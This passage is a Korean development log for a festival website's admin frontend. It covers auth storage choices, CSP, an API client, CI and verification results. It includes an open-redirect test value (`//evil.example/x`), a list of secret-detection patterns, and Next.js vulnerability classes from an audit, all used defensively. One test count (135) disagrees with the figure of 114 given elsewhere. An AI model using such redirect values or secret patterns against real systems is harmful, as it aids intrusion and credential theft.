| `youtube-search.constants.ts:9`, `youtube.constants.ts:21`, `youtube.module.ts:62` | "프론트 실시간 폴백(`top-video`)은 아직 쿼리 방식", 저장 형태 근거, 환경변수 이름 구분 | 폴백이 없어져 서술이 낡음 |
| `youtube-url.ts:30`, `youtube-video-id.ts:35`, `youtube-video-id.spec.ts:47` | "프론트 `open-track-video.ts`가 저장값을 **try/catch 없이** `new URL`에 넣는다" | 이번에 try/catch·호스트 검증이 생겨 낡음. 저장 형식 CHECK 결정(§10)의 근거 서술도 함께 조정 |
| `youtube-batch.service.ts:474` | 검색어가 `open-track-video`와 같은 모양 | **여전히 유효**(이번에 프론트가 같은 모양으로 맞췄다) |
| `apps/api/.env.example:79` | "프론트의 `YOUTUBE_API_KEY`를 재사용하지 말 것" | 프론트가 더 이상 쓰지 않아 경고 대상이 사라짐 |
| `youtube.module.spec.ts:83` | 프론트 키 이름을 읽지 않는다는 테스트 | 여전히 유효(회귀 방지) |

- **캐러셀 라벨** `day1 Artist` 정리(`Day 1 Artist` 등)
- **`setlistCards` 정적 폴백**의 처리 방침(위)
- **관리자 UI(7c)에서 지킬 것**: `day` 입력은 `dayN` 형식만 만들도록(서버가 강제한다), 팀 등록 직후 방문자에게 어떻게 보이는지(이미지·곡이 없으면 `/setlist`·홈에서 제외됨)를 화면에 안내
- **일차 탭 수 상한**: 탭이 데이터에서 동적으로 늘어나므로 day가 많아지면(모바일 폭) 줄바꿈이 필요할 수 있다 — 현재 디자인은 1~2개 기준

### 배포 후 내가 할 일 (사용자)

1. **배포가 새 코드로 나간 것을 확인**한다 — `/api/youtube/top-video`가 404이고, 영상 없는 곡이 검색 결과로 열리는지 본다
2. **Vercel 환경변수 `YOUTUBE_API_KEY` 제거** — 코드가 더 이상 읽지 않는다(`git grep`으로 확인). **1번을 확인한 뒤에** 지운다(롤백하면 옛 코드가 키를 요구한다)
3. **Google Cloud 콘솔에서 프론트 폴백용 API 키 폐기 여부 판단** — 사용처가 없어졌다. 폐기 전에 사용량이 0인지 보고, 롤백 가능성이 지난 뒤에 폐기한다. 키가 URL 쿼리(`key=`)로 나갔던 이력이 있으므로 폐기하는 쪽을 권장한다(추정: 서버 → 구글 요청이라 브라우저에는 노출되지 않았으나, 요청 URL이 로그에 남았는지는 확인하지 못했다)
4. 로컬 `.env.local`의 `YOUTUBE_API_KEY` 줄 삭제(선택, 커밋 대상 아님)
5. 실기기에서 **모바일 YouTube 앱으로 열리는지**, **스크린리더 읽힘**, **Vercel 프리뷰**를 확인한다(모두 이번에 미확인)
6. `.claude/settings.local.json`에 있던 Slack 웹훅 재발급 검토(트러블슈팅 5)

### 롤백

코드 변경만이고 **DB·스키마 변경이 없다.** 커밋 4개를 각각 되돌릴 수 있다: ④를 되돌리면 방어가 사라지고, ③을 되돌리면 폴백 라우트와 fetch 흐름이 돌아온다(그 경우 Vercel의 `YOUTUBE_API_KEY`가 필요하니 2·3번 배포 후 작업은 롤백 가능성이 지난 뒤에 한다). ①을 되돌리면 id 범위 폴백과 2일차 고정 탭이 돌아오고, ②를 되돌리면 캐러셀 노출 조건과 가짜 곡 모달이 돌아온다. ②는 ①의 `src/lib` 모듈을 쓰므로 ①과 ②는 함께 되돌린다.

### 완료 상태 및 다음 단계

- 브랜치 `feature/public-frontend-fixes`, 푸시·PR 보류
- **다음**: 7c 관리자 UI(`apps/admin`, 별도 Vercel 프로젝트) → 7d 배포 → 59곡 유튜브 배치·리뷰. 위 "남겨둔 결정"은 7c에서 함께 정리한다. **7b 배포 직후에는 59곡이 돋보기 표시로 보이고, 배치 리뷰에서 승인되는 만큼 `▶`로 바뀐다**

## 18. work02-7c-1 — 관리자 프론트(apps/admin) 설계 + 뼈대: 로그인 · 인증 저장 · 레이아웃 · API 클라이언트 · CI (2026-09-22)

- **날짜**: 2026-09-22
- **브랜치**: `feature/admin-app-scaffold` (`develop`과 같은 커밋 `3a50216`에 있던 브랜치. 커밋 0개·upstream 없음·원격에 없음을 확인하고 그대로 사용. 분기 전 `develop == origin/develop`)
- **커밋**: 프로젝트 생성 `7211cf3` / API 클라이언트 `ba1794a` / 로그인·인증 `c09a67d` / 보호 라우트·자리표시 화면 `0c21f07` / CI `53e5be8` / 문서 `669a4f8` / **의존성(next 16.3.5, cn 제거) `f6d30d7`** / **레이아웃·토큰·로그인 화면(7c-1b) `f4aa60d`** / 문서 갱신(이 커밋)
  - 순서가 "로그인 → 레이아웃 → API 클라이언트"가 아닌 것은 로그인이 API 클라이언트를 쓰기 때문이다. 브라우저 검증에서 나온 수정 2건(토큰 저장소, 429 남은 시간)과 스타일 1건은 해당 커밋에 fixup으로 합쳤다
- **관련 PR**: work02-7c1, `feat: 관리자 프론트(apps/admin) 뼈대 (로그인, 인증 저장, 레이아웃, API 클라이언트)` (푸시/PR 생성은 보류)
- **상태**: 구현·단위 테스트 114개·브라우저 검증 완료. **DB 쓰기·스키마 변경 0건, `apps/api` 무변경, 공개 프론트 무변경**(루트 `package*.json`·`src` diff 0, 루트 lint·build 결과 동일). 실계정 로그인은 하지 않았다(사용자 몫)
- **디자인 변경(2026-09-22, 사용자 요청) → 7c-1b에서 구현, 화면 승인 대기**: 공개 랜딩과 완전히 다른 전형적인 관리자 대시보드 UI(좌측 어두운 사이드바 + 상단 바)로 방향이 바뀌어 레이아웃·토큰을 다시 정하고 구현했다(아래 "7c-1b 디자인·레이아웃"). 이전 상단 메뉴형 레이아웃은 push 전이라 브랜치에서 걷어 냈고 원본은 로컬 백업 브랜치였고, **화면 승인(2026-09-22) 뒤 삭제했다**(커밋 `46ccf57`이었다). 이 브랜치에는 **push·PR을 하지 않았다**

### 배경

7단계(관리자 UI)의 첫 단계다. 팀·곡·유튜브 화면(7c-2~4)을 올릴 **기반**을 먼저 만든다: 별도 앱, 인증 저장과 만료 UX, 보호 라우트, API 클라이언트와 오류 매핑, 최소 CSP, CI. 관리자는 1~3명(비개발자 임원진)이고 동시 편집은 드물다는 전제다.

### 구현 전 조사 (실측·공식 문서)

**Vercel(공식 문서 확인)**

| 항목 | 사실 | 영향 |
| --- | --- | --- |
| 모노레포 | 같은 레포에서 프로젝트를 여러 개 만들고 각각 Root Directory 지정. 기본은 "every commit will issue a deployment for **all** connected projects" | 공개 프로젝트는 `apps/admin` 커밋에도 재빌드된다(루트 변경도 admin을 재빌드) |
| 자동 스킵 | **workspaces가 있어야 한다**(npm/yarn/pnpm/Bun workspaces). 원문: workspace 정의 밖 변경은 "global changes and deploy all applications" | 이 레포는 루트 `workspaces`가 없어 **쓸 수 없다.** 도입하면 루트 lockfile이 재작성돼 공개 사이트 배포 위험이 생긴다 |
| Ignored Build Step | 내장 옵션 "Only build if there are changes in a folder". 종료 코드 **0 = 빌드 취소, 1 = 빌드 진행**. 취소된 빌드도 배포 쿼터·동시 빌드 슬롯을 쓴다 | 결정: **admin 프로젝트에만** 건다. 공개 프로젝트는 그대로(커밋당 2회 빌드 감수) |
| Hobby 한도 | 레포당 프로젝트 25, 배포 100/일, 동시 빌드 1. 조직 소유 레포는 Hobby 불가 | 레포가 `SUMMIT-Band-Dev/…`(조직)이고 이미 배포 중이라 Hobby가 아닐 것으로 **추정** — 플랜은 **확인 필요** |
| 함수 시간 | Fluid compute(기본) 기준 Hobby 기본·최대 300초 | 이번엔 BFF를 쓰지 않아 해당 없음(아래 인증 판단) |

**Next.js 16(로컬 `node_modules/next/dist/docs`)**: `middleware.ts`가 **`proxy.ts`로 이름이 바뀌었고 런타임은 `nodejs` 고정**이다. 문서 원문: proxy는 "not ... a full session management or authorization solution"이며 쿠키만 읽는 낙관적 검사용이다. Async Request API의 동기 접근은 완전히 제거됐다.

**버전(레지스트리, latest가 RC/beta인 것 없음)**: Next 최신은 16.3.5(2026-09-11), 루트는 16.2.4(2026-04-15). 라이선스는 전부 MIT.

> ⚠️ **`npm audit`이 Next 16.2.4에서 critical을 보고한다.** 범위 `9.3.4-canary.0 - 16.3.2`에 인증 우회(Middleware/Proxy bypass), RSC 캐시 오염, Server Actions DoS, 이미지 최적화 API 취약점(AVIF 경유 RCE 포함), Windows 호스팅 RCE 등 **약 25건**이 걸린다. 수정은 16.3.5(`postcss`·`sharp` 취약점도 함께 해소). **이 앱이 실제로 쓰는 표면과 겹치는지는 건별로 확인하지 않았다**(추정: 이 앱은 proxy·Server Actions·이미지 최적화 API를 쓰지 않는다). 다만 **공개 사이트(루트, 같은 16.2.4)도 같은 상태다.**
> 결정 3의 "루트와 동일한 16.2.4"는 "이 레포에서 검증된 유일한 버전"이 근거였는데, **그 근거가 보안 사실 앞에서 약해졌다.** 이번 브랜치는 결정대로 16.2.4로 고정했고, **스크래치 복사본에서 `next@16.3.5` + `eslint-config-next@16.3.5`로 올려 lint·build·typecheck·test 114개가 전부 통과하고 `npm audit`이 0건임을 확인했다.** 올릴지는 사용자 결정이다(아래 남겨둔 결정 1).

**인증 저장 방식**(현행 API: `Authorization` 헤더 + `credentials:false` CORS, `http:`는 루프백만 허용)

| 방식 | XSS | CSRF | 2시간 만료 UX | 치명적 부작용 |
| --- | --- | --- | --- | --- |
| (a) localStorage + 브라우저→API 직접 | 토큰 탈취 가능 | 해당 없음 | 새로고침·새 탭 유지 | 없음 |
| (b) 메모리만 | 가장 안전 | 해당 없음 | 새로고침마다 재로그인 | 로그인 5회/5분 한도를 갉아먹는다 |
| (c) BFF(Next 라우트 프록시 + httpOnly 쿠키) | 토큰이 JS에 없음 | **새로 필요** | 좋음 | **모든 API 호출이 Vercel 함수 IP에서 나가 로그인 5회/5분이 관리자 전원 공유가 되고**, API가 실제 IP를 알려면 `X-Forwarded-For`를 믿어야 해 §16이 경고한 위조 위험과 만난다 |
| (d) API를 쿠키로 변경 | — | — | — | 이번 범위 밖(API 변경 승인 필요) |

**공개 프론트 재사용**: `globals.css`(361줄)는 포스터용 그라데이션이라 재사용 가치가 없다. `src/lib/line-up.ts`·`image-source.ts`도 admin이 쓸 일이 거의 없다. 패키지화는 workspaces가 필요해 위 Vercel 문제와 얽히므로 **복사**가 기본안이다. **새로 발견한 함정**: 기존 15팀의 `image_src`는 `/day1-team1.png` 같은 **공개 사이트 기준 상대경로**라 admin 오리진에서는 그대로 열리지 않는다 → `NEXT_PUBLIC_PUBLIC_SITE_ORIGIN`이 필요하다(7c-2).

### 설계 결정 (사용자 승인)

1. 인증 저장 **localStorage**(위 (a)). 방어는 저장소가 아니라 "서버 문자열을 텍스트로만 렌더링 + `dangerouslySetInnerHTML` 금지 + 서드파티 스크립트 0 + 최소 CSP"의 조합이다. 저장소 선택은 XSS 앞에서 큰 차이가 없다(sessionStorage도 같은 탭에서 읽힌다)
2. Next/React는 루트와 같은 **16.2.4 / 19.2.4**로 정확 고정(위 audit 경고 참조) — ~~16.2.4~~ **[2026-09-22 변경: audit critical 때문에 `apps/admin`만 `next`·`eslint-config-next`를 16.3.5로 상향, `npm audit` 0건. 공개 사이트는 별도 PR. 아래 "7c-1b" 참조]**
3. 의존성 승인(정확 버전): TanStack Query 5.103.2, react-hook-form 7.88.0, zod 4.6.5, @hookform/resolvers 5.9.1, vitest + vite, shadcn CLI. dnd-kit은 7c-2에서 별도 승인
4. Vercel: 공개 프로젝트는 그대로, admin 프로젝트에만 "Only build if there are changes in a folder = `apps/admin`"
5. 7c 분할: **1 뼈대 / 2a 팀 CRUD(재정렬 포함) / 2b 카드 업로드 / 3 곡·앨범 커버 / 4 유튜브 리뷰·배치.** 2b는 multipart·1MB·413·CDN 캐시·비율 안내로 성격이 달라 분리했고, 프로덕션 첫 쓰기가 나는 지점이라 PR을 섞지 않는다
6. 라이트 단색, 다크모드 없음. → **[2026-09-22 갱신: 어두운 사이드바 + 밝은 콘텐츠(C안), 다크모드는 여전히 없음 — 아래 "7c-1b"]** 7. 곡 관리 주소는 `/songs?teamId=`. 8. `.env.example`에 `NEXT_PUBLIC_PUBLIC_SITE_ORIGIN`(빈 값+설명)

### 작업 내용

1. **프로젝트 생성**: `apps/admin`(Next 16.2.4 · React 19.2.4 · Tailwind 4 · shadcn radix-nova). 모든 의존성을 정확 버전으로 고정하고 독립 `package-lock.json`. `next.config.ts`에 최소 CSP·보안 헤더·`noindex`·이미지 최적화 API 비활성·Turbopack 작업 루트 명시. 개발 포트 3010
2. **API 클라이언트**(`src/lib/api/`): `apiRequest`가 유일한 호출 통로. `Authorization` 헤더 인증(`credentials: "omit"`), 절대 URL·`//host`·`\` 경로 거부(토큰이 다른 곳으로 나가지 않게), JSON/FormData, 기본 15초 타임아웃, 외부 취소 signal(타임아웃과 취소를 구분), **재시도 없음**. 오류는 `ApiError`(network/timeout/aborted/validation/unauthorized/forbidden/not_found/conflict/payload_too_large/unsupported_media_type/rate_limited/server/unknown)로 정규화. 서버 한국어 메시지는 가공 없이 보존(배열 포함)하고, 프레임워크 영문 기본 문구와 프록시 502/504는 한국어 문구로 대체(**한글이 한 글자라도 있으면 서버가 의도한 문구**라는 규칙). 429는 `Retry-After`(초·HTTP 날짜)를 "N분 뒤"로, 409는 새로고침 안내를 덧붙인다. 계약 타입은 손으로 옮기되 **미러링하는 API 파일 경로를 주석으로 명시**해 드리프트를 관리한다
3. **로그인·인증**: 토큰 저장은 `token-storage.ts` 한 곳(저장 실패 시 메모리로 이어 가고, **저장소가 정상이면 저장소가 유일한 진실**). JWT `exp`만 해석해(서명 검증 없음, UX 용도) 만료 시각에 재로그인을 안내한다. 로그인 폼은 RHF + Zod로 **서버 DTO와 같은 규칙·문구**의 제출 전 검증(빈 값, 공백 아이디, 아이디 ≤64, 비밀번호 ≤256 — 서버가 400도 5회/5분 한도에 세므로 실패 요청을 보내지 않는다), 전송 중 재제출 차단, 401은 서버 메시지 그대로 + 비밀번호 칸 비움, **429는 "N분 뒤에 다시 시도" + 새로고침 뒤에도 버튼 잠금(sessionStorage), 남은 시도 횟수는 표시하지 않음.** `?next=`는 같은 사이트 경로만 허용(오픈 리다이렉트 방지)
4. **세션 만료 = 제자리 재로그인**: 401을 받거나 만료 시각이 되면 로그인 페이지로 **이동하지 않고 현재 페이지 위에** 재로그인 대화상자를 띄운다. 페이지가 언마운트되지 않으므로 작성 중이던 폼 상태가 보존된다. 열 때부터 만료돼 있던 토큰은 로그인 페이지로 보낸다(둘을 구분). 다른 탭의 로그인·로그아웃도 `storage` 이벤트로 동기화한다
5. **보호 라우트·레이아웃**: `(admin)` 그룹 레이아웃이 `AuthGate`로 로그인 여부를 확인한다(미로그인 → `/login?next=…`, 직접 로그아웃 → next 없이 `/login`, 세션 만료 → 페이지 유지 + 재로그인 대화상자). 화면 틀은 `layout/app-shell.tsx`(어두운 사이드바 + 상단 바 + 서랍, 7c-1b)가 맡는다. 세 메뉴(팀 관리 / 곡 관리 / 유튜브 연결 관리)는 "준비 중" 자리표시 페이지(곡 관리는 목록/상세 분할 슬롯). `not-found`·`error` 경계
6. **CI**: `admin` 잡(lint · build · typecheck · test). 아래 기술 판단 참조

### 기술 판단

| 쟁점 | 결정 | 이유 |
| --- | --- | --- |
| 보호 라우트 | **클라이언트 가드**(proxy 미사용) | 토큰이 localStorage에 있어 proxy(쿠키만 읽음)가 **구조적으로** 볼 수 없다. Next 문서도 proxy를 인가 수단으로 쓰지 말라고 한다. **UI 가드는 UX일 뿐, 실제 경계는 API의 JWT Guard**임을 `guard.ts`·README에 명시 |
| 401 처리 | 이동이 아니라 **제자리 대화상자** | 이동하면 언마운트되어 폼 내용을 잃는다. 대화상자는 닫기 수단을 일부러 없앴다(만료된 채 계속 조작하면 요청마다 401). 나가려면 로그아웃 |
| 서버 상태 | TanStack Query 5, 지금 도입 | 409 후 새로고침·제출 중 잠금·재조회가 4개 화면 전부에 필요하다. **조회는 일시적 오류만 1회 재시도, 변경은 자동 재시도 없음, 낙관적 업데이트 금지**(재정렬·승인은 서버가 권위) |
| 영문 메시지 처리 | 한글 포함 여부로 구분 | Nest/Express 기본 문구("Not Found", "request entity too large")가 화면에 나가지 않게 하면서 서버가 의도한 문구는 그대로 둔다 |
| 토큰 저장소 | 저장소가 정상이면 **저장소가 유일한 진실**, 실패할 때만 메모리 | 메모리 값을 늘 함께 들고 있으면 다른 탭의 로그아웃이 이 탭에 반영되지 않는다(브라우저 검증에서 실제로 발견, 아래) |
| CSP | `script-src 'self' 'unsafe-inline'` (+개발에서만 `'unsafe-eval'`), `connect-src 'self'` + API 오리진, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri`·`form-action 'self'` | **알려진 타협**: Next 인라인 스크립트(flight 데이터) 때문에 nonce 없이는 `'unsafe-inline'`이 필요해 **인라인 스크립트 주입 자체는 막지 못한다.** 막는 것은 외부 스크립트 로드·외부로의 데이터 전송·프레임·form 탈취·base 변조·플러그인이다. nonce 방식(proxy + 동적 렌더링)은 7d 이후 재검토 |
| CSP 배포 오리진 | 빌드 시점의 `NEXT_PUBLIC_API_BASE_URL`에서 `connect-src`를 만든다 | 같은 값이 번들에도 박히므로 둘이 어긋나지 않는다. **값을 바꾸면 다시 빌드해야 한다.** `NEXT_PUBLIC_PUBLIC_SITE_ORIGIN`은 `img-src`에만 들어간다. Supabase·mzstatic·ytimg 이미지 호스트는 각 화면이 실제로 쓸 때 추가한다(최소 권한, `csp.ts` TODO) |
| vitest | **4.1.11 + vite 8.3.0**(`apps/api`와 같은 라인) | 5.0.1은 peer `vite ^6.4‖^7‖^8`을 만족하지만 이 레포에서 검증되지 않았다. 필요한 기능 차이가 없어 이미 통과 중인 4.x 라인을 골랐다. vite는 vitest의 **필수 peer**라 명시 설치 |
| shadcn의 `cn` 패키지 | **제거**, `clsx` 2.1.1 + `tailwind-merge` 3.7.0으로 `utils.ts` 구성 | 처음에는 수용했으나(maintainer=shadcn, MIT, 의존성 0, 설치 스크립트 없음을 확인했다) 게시가 하루 전이고 0.x라 사용자 결정으로 표준 조합으로 교체했다. `shadcn add` 뒤에는 `cn` import가 다시 생기지 않았는지 확인한다 |
| 폰트 | 시스템 폰트 스택 | `next/font/google`은 빌드 시 외부 요청이 필요하고 CI·CSP에도 부담이다. shadcn init이 넣은 Geist 설정은 제거했다 |
| workspaces | **도입하지 않음** | 루트 lockfile 재작성 = 공개 사이트 배포 위험. 대가는 Vercel 자동 스킵을 못 쓰는 것(Ignored Build Step으로 대체) |
| CI | `admin` 잡 추가, 잡마다 자기 lockfile | 자리표시 `NEXT_PUBLIC_API_BASE_URL`(공개 값)만 사용, 비밀값·저장소 변수 미참조, `pull_request_target` 미사용, 액션은 기존과 같은 SHA 고정, 권한 `contents: read` |
| 테스트 | 순수 함수 중심(vitest, node 환경), **135개** | 컴포넌트 테스트(jsdom·RTL 등 4개 패키지)는 폼이 실제로 생기는 7c-2에서 추가한다. 보호 라우트는 판단을 순수 함수(`decideGuard`)로 분리해 테스트하고, 메뉴 정의·로그인 유지 시간 포맷·**색 하드코딩 금지(`design-tokens.test.ts`)**도 자동 검사한다. 화면 동작은 브라우저로 확인했다 |

### 검증

| 항목 | 결과 |
| --- | --- |
| `apps/admin` lint · typecheck · build · test | 전부 통과. 테스트 **114개**(CSP 8, 오류 매핑 44, 설정 5, 클라이언트 20, 인증 37) |
| 깨끗한 복사본에서 CI 절차 재현 | `git ls-files`로 복사 → `npm ci` → lint → build(자리표시 env) → typecheck → test **전부 통과, 잠금 파일 해시 불변**. Node 24.12 / npm 11.6.2 — **러너의 정확한 npm 버전은 미확인** |
| 루트 공개 프로젝트 | 루트 `package.json`·`package-lock.json`·`src` diff **0**, 루트 lint·build 결과 동일(라우트 10개), 루트 lock 해시 불변 |
| `apps/api` | lint·typecheck·build 통과, 테스트 972개 통과. 코드 무변경. `migrate status` 최신 |
| CORS (실제 API 3012 + admin 3010) | 허용 오리진 preflight: `Access-Control-Allow-Origin: http://localhost:3010`, `Allow-Headers: Authorization,Content-Type`, `Expose-Headers: Retry-After`. **다른 오리진은 `Allow-Origin` 헤더가 없고, 브라우저에서 실제로 차단**(`TypeError`), 허용 오리진에서는 같은 호출이 읽힘(401) |
| 로그인 화면(개발 서버) | 빈 값 제출 → 두 필드 각각 안내, **요청 0건**. 공백 아이디 → 안내, 요청 0건. 존재하지 않는 계정으로 **실제 API 401** → 서버 메시지 그대로, 비밀번호 칸 비워지고 포커스 이동, 토큰 저장 없음. 전송 중 버튼이 "로그인 중…" |
| 429 (응답 대역) | "로그인 시도가 너무 많습니다. 15분 뒤에 다시 시도해 주세요.", 버튼 비활성, 차단 중 재클릭해도 **추가 요청 없음**, **새로고침 뒤에도 잠금 유지**, 남은 시도 횟수 문구 없음 |
| 보호 라우트 | `/` → `/login`, `/youtube` → `/login?next=%2Fyoutube`. 로컬 서명 토큰 주입 시 `/` → `/teams`, `/auth/me`에 `Authorization` 헤더가 실려 호출됨, 계정 이름 표시, 임시 메뉴 3개·로그아웃 버튼(재검증: 레이아웃 제거 뒤 `/auth/me`를 응답 대역으로 두고 다시 확인), 곡 관리·유튜브 연결 관리 이동. 로그인 상태에서 `/login` → `/teams`, `?next=//evil.example/x` → `/teams`(외부로 안 감), `?next=/youtube` → `/youtube` |
| 세션 만료 | **서명이 틀린 토큰**(클라이언트는 유효로 봄)으로 실제 API 401 → **경로 유지 + 본문 그대로 마운트(마커 유지) + 재로그인 대화상자**, Esc·바깥 클릭으로 안 닫힘, 닫기 버튼 없음. 재로그인 성공(응답 대역) → 대화상자 닫힘·경로·본문 유지·토큰 교체·`/auth/me` 재조회 성공. 만료 시각이 지나면 대화상자(짧은 토큰). 열 때부터 만료된 토큰 → 로그인 페이지 + 저장소에서 제거 |
| 다른 탭 동기화 | 한 탭에서 로그아웃하면 다른 탭이 `/login?next=…`로 이동 |
| 로그아웃 | `/login`(next 없음), 토큰 삭제, 이후 `/teams` 접근 시 로그인으로 |
| 반응형·스크린샷 | 이전 상단 메뉴 레이아웃 기준의 검증은 폐기했다. **7c-1b의 어두운 사이드바 레이아웃으로 다시 검증**했다(아래 "7c-1b" 검증 표: 1023/1024px 경계, 390px 서랍, 캡처 6장) |
| CSP | 개발·운영 빌드 모두 **정상 사용 중 위반 0건.** 운영: `unsafe-eval` 없음, 허용 API 오리진 fetch 통과, **허용되지 않은 오리진 fetch·외부 스크립트는 브라우저가 CSP 위반으로 차단**(콘솔 메시지 확인). 응답 헤더 6종(CSP·`X-Frame-Options: DENY`·`nosniff`·`Referrer-Policy: no-referrer`·`Permissions-Policy`·`X-Robots-Tag: noindex`) 확인 |
| Next 16.3.5 호환(스크래치 복사본) | `next`·`eslint-config-next`를 16.3.5로 올려 lint·build·typecheck·test 114개 **통과, `npm audit` 0건**, CSP 헤더 유지 |
| 비밀값 | 이 브랜치가 추가한 파일에서 `sb_secret_`·`eyJ`·`AIza`·`postgres://…:…@`·Slack 웹훅 패턴을 파일 이름만 출력해 검사했고 **값은 0건**이다(일치한 것은 이 문서가 패턴 이름을 언급한 줄과, `apps/admin/package-lock.json`의 무결성 해시 한 줄(`eyJ`가 base64 무작위 문자열에 우연히 들어 있음)뿐이라 오탐으로 판단했다). 검증용 토큰은 스크래치패드의 초기화 스크립트 파일로만 주입했고 값을 출력하지 않았으며, 끝난 뒤 파일을 삭제했다. API·admin 로그에도 패턴 없음 |
| 서버 정리 | 검증에 쓴 API(3012)·admin(3010) 서버를 모두 종료(리스너 0). 실제 `/auth/login` 호출은 **존재하지 않는 계정 401 두 번**뿐이다(5회/5분 한도 안) |

**미확인**: **실계정 로그인**(사용자가 직접), 모바일 **실기기**, **스크린리더**가 실제로 읽는 방식(`aria-label`·`role`·`aria-current`가 붙은 것만 DOM으로 확인), **Vercel 프리뷰**, https 배포 환경에서의 CSP(`upgrade-insecure-requests`) 동작, **운영 CSP가 `eval`을 막는지**(자동화 도구가 CDP로 평가해 이 항목은 시험이 성립하지 않았다 — 헤더에 `unsafe-eval`이 없다는 것만 확인), 러너의 정확한 npm 버전, Turbopack 작업 루트 경고가 CI에서 나오는지(로컬은 명시해 없앴다), Vercel 플랜.

### 트러블슈팅 기록

1. **`shadcn init`이 멈춤** — 대화형 프리셋 선택 프롬프트(`-y`로도 뜬다)와 "framework not detected"(`next.config.*`가 있어야 감지) 때문. `-p nova`를 주고 `next.config.ts`를 먼저 만들어 해결. 또한 캐럿 버전(`^`)으로 설치하므로 설치 뒤 전부 정확 고정으로 바꿨다
2. **`npm audit` critical(Next 16.2.4)** — 위 "구현 전 조사"의 경고. 결정을 뒤집지 않고 16.3.5 호환을 스크래치에서 검증해 사용자 결정 자료로 남겼다
3. **`parseRetryAfter("-5")`가 0을 돌려줌** — 단위 테스트에서 발견. `Date.parse`가 `"-5"`를 연도로 읽는다. 요일·월 이름이 없는 값은 HTTP 날짜로 보지 않도록 고쳤다
4. **429 남은 시간이 "16분 뒤"로 표시(900초인데)** — 브라우저에서 발견. 화면이 1초 단위(내림) 시각으로 계산하는데 저장한 종료 시각이 ms 단위라 최대 1초 남는 것이 올림되어 901초가 됐다. 종료 시각을 초 단위로 내려 저장하도록 고침
5. **다른 탭의 로그아웃이 반영되지 않음** — 브라우저 다중 탭 검증에서 발견. `readToken`이 저장소가 비어도 메모리 보관본을 돌려줘서, 다른 탭이 저장소에서 지운 토큰을 이 탭이 계속 들고 있었다. **저장소가 정상이면 저장소가 유일한 진실**이 되도록 고치고, 쓰기만 실패한 경우(용량 초과 등)에만 메모리로 잇는다. 단위 테스트 2건 추가
6. **재로그인 대화상자의 아이디 칸이 비어 있음** — 만료를 `/auth/me`의 401로 처음 알게 된 경우 캐시된 계정 이름이 없다. 폼 검증이 정상 동작한 것이고 사용자가 직접 입력하면 된다(테스트가 아이디를 채우지 않아 처음엔 실패로 보였다). 7c-2에서 마지막 계정 이름을 기억할지 검토
7. **자동화 도구의 한계로 검증이 잘못 나온 사례** — `[role="alert"]`가 Next의 route announcer(`<next-route-announcer>`)까지 잡아 서버 메시지 대신 페이지 제목을 읽었다(`form [role="alert"]`로 한정해 해결). Playwright 샌드박스에는 `require`·`URL`이 없어 파일 접근·URL 파싱을 다르게 해야 했다. `page.route` 대역이 다음 측정에 남는 함정은 §17 트러블슈팅과 같다
8. **입력칸 테두리 대비 부족** — 스크린샷에서 발견. shadcn 기본 `--input`이 흰 배경 대비 약 1.2:1이라 경계가 보이지 않았다. `--input`을 진하게 올려 WCAG 1.4.11(3:1)을 맞췄다
9. **검증 출력에 계정 이름이 한 번 노출** — 다른 탭 동기화를 디버깅하며 페이지 본문 앞부분을 출력해 헤더의 관리자 로그인 아이디(6글자)가 세션 기록에 남았다. 비밀번호·토큰은 아니다. 이후 스크린샷은 계정 이름을 가린 뒤 캡처하고 글자 수만 확인했다
10. **vitest 설정 CJS 경고** — `vitest.config.ts`에서 ESM 문법 경고. `.mts`로 바꿔 해결

### 7c-1b 디자인·레이아웃 (2026-09-22, 사용자 승인 반영)

공개 랜딩과 완전히 다른 **전형적인 관리자 대시보드 UI**를 원한다는 요청으로 레이아웃·디자인 토큰을 다시 정했다(레퍼런스로 언급된 CleanPay 화면은 **이미지가 전달되지 않아 텍스트로 설명된 패턴만** 반영했다: 페이지 헤더(제목 + 우측 주 동작), 표(상태 뱃지, 행 끝 동작 버튼, 44px 행), 필터 카드는 곡·리뷰 화면에서 필요할 때만). 이미 구현·커밋했던 상단 메뉴형 레이아웃은 push 전이라 브랜치에서 걷어 냈고, 원본은 로컬 백업 브랜치에 두었다가 화면 승인 뒤 삭제했다.

**승인된 결정**

1. **레이아웃 C안**: 좌측 어두운 고정 사이드바(232px, 아이콘+라벨, 접이식 없음) + 밝은 콘텐츠. 1024px 미만은 서랍형. 하단에 계정명 · 로그인 유지 시간 · 로그아웃
2. **패턴**: 페이지 헤더(제목 + 설명 + 우측 주 동작), 표(상태 뱃지, 행 끝 동작, 44px 행). **페이징·"더 보기"는 두지 않는다**(팀 15, 곡 64). 필터 카드는 곡·리뷰 화면에서 필요할 때만
3. **정체성 색**: 블랙 + 파랑(VS Code 계열). 사이드바는 순검정 대신 진한 남색-차콜. 색은 `:root` 변수에만 두고 컴포넌트에 하드코딩 금지
4. **밀도**: 표준-조밀(본문 14 / 입력·버튼 36 / 표 행 44), 시스템 폰트 스택, 다크모드 없음, 데스크톱 위주(모바일은 서랍 동작만 보장)
5. **로그인 유지 시간 표시** 포함, **곡 관리의 팀 목록(좌) + 곡 패널(우) 분할**은 구조 슬롯만(실제 화면은 7c-3)
6. **로그인 페이지**: 카드형 중앙 정렬, 블랙/파랑 브랜드 요소

**토큰(전부 `apps/admin/src/app/globals.css`의 `:root` 한 곳)** — 대비율은 WCAG로 직접 계산했다

| 역할 | 값 | 대비 |
| --- | --- | --- |
| 주색 | `#0072c0`(hover `#005fa3`) | 흰 글자 **5.04:1** / 6.63:1. `#007acc`는 4.51:1로 통과는 하지만 여유가 없어 5:1 이상이 되도록 살짝 진하게 했다 |
| 본문 · 보조 글자 | `#1b2430` · `#4f5b6b` | 카드 위 15.65:1 · 페이지 배경 위 6.32:1 |
| 페이지 배경 · 카드 | `#f3f5f8` · `#ffffff` | — |
| 입력칸 테두리 | `#7d8899` | 카드 위 3.59:1(WCAG 1.4.11 3:1 이상) |
| 위험 · 성공 · 경고 글자 | `#c62828` · `#1b7a3a` · `#8a5a00` | 5.62 · 5.40 · 5.93:1 |
| 뱃지(글자/배경) | 중립·성공·경고·위험·정보 각 5쌍 | 6.7~7.9:1 |
| 사이드바 | 배경 `#141a24`, 글자 `#d3dae6`, 보조 `#8f9bb0`, 활성 배경 `#0b3a63`+흰 글자, 인디케이터 `#3b9eff`, 경고 `#ffb454` | 12.42 · 6.22 · 11.67 · 6.25 · 9.9:1 |
| 로그인 배경 | `#0d1117` | — |
| 형태·글꼴 | radius 8px(작은 요소 ≈5px, 대화상자 ≈11px), 시스템 폰트 스택, 글자 20/16/14/13/12 | — |
